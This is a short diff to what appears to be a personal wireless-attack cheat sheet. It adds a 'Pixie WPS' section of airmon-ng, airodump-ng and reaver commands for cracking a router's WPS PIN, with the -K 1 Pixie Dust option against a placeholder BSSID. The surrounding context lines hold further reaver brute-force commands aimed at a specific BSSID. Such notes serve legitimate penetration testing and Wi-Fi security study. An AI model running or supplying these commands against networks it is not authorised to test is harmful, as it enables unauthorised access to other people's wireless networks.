@@ -75,6 +75,15 @@ reaver -i mon0 -b 8D:AE:9D:65:1F:B2 -vv
 reaver -i mon0 -b 8D:AE:9D:65:1F:B2 -S --no-nacks -d7 -vv -c 1
 
 
+Pixie WPS
+---------
+
+airmon-ng check
+airmon-ng start wlan0
+airodump-ng wlan0mon --wps
+reaver -i wlan0mon -c 11 -b 00:00:00:00:00:00 -K 1
+
+
 Wireless Notes
 --------------
 
